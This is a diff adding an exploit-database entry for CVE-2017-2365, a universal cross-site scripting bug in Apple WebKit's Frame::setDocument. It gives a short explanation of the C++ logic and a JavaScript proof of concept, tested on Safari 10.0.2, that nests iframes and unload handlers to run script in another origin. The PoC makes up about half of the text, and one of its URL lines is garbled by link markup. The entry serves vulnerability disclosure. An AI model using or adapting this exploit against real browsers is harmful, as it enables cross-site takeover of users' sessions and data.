@@ -1,0 +1,73 @@
+id: 27110
+date: 02/24/2017
+title: Apple WebKit Frame::setDocument UXSS Exploit
+author: lokihardt
+cves: CVE-2017-2365
+
+Apple WebKit: UXSS via Frame::setDocument 
+
+CVE-2017-2365
+
+
+Here's a snippet of Frame::setDocument.
+
+void Frame::setDocument(RefPtr<Document>&& newDocument)
+{
+    ASSERT(!newDocument || newDocument->frame() == this);
+
+    if (m_doc && m_doc->pageCacheState() != Document::InPageCache)
+        m_doc->prepareForDestruction();
+
+    m_doc = newDocument.copyRef();
+    ...
+}
+
+Before setting |m_doc| to |newDocument|, it calls |prepareForDestruction| that fires unload event handlers. If we call |Frame::setDocument| with the new document |a|, and call |Frame::setDocument| again with the new document |b| in the unload event handler. Then |prepareForDestruction| will be never called on |b|, which means the frame will be never detached from |b|.
+
+PoC:
+"use strict";
+
+let f = document.documentElement.appendChild(document.createElement("iframe"));
+let a = f.contentDocument.documentElement.appendChild(document.createElement("iframe"));
+
+a.contentWindow.onunload = () => {
+    f.src = "javascript:''";
+
+    let b = f.contentDocument.appendChild(document.createElement("iframe"));
+    b.contentWindow.onunload = () => {
+        f.src = "javascript:''";
+
+        let doc = f.contentDocument;
+
+        f.onload = () => {
+            f.onload = () => {
+                f.onload = null;
+
+                let s = doc.createElement("form");
+                s.action = "javascript:alert(location)";
+                s.submit();
+            };
+
+            f.src = "<a href="https://abc.xyz/";" title="" class="" rel="nofollow">https://abc.xyz/";</a>
+        };
+
+    };
+};
+
+f.src = "javascript:''";
+
+
+Tested on Safari 10.0.2(12602.3.12.0.1).
+
+
+
+This bug is subject to a 90 day disclosure deadline. If 90 days elapse
+without a broadly available patch, then the bug report will automatically
+become visible to the public.
+
+
+
+
+Found by: lokihardt
+
+#  0day.today [2023-03-24]  #
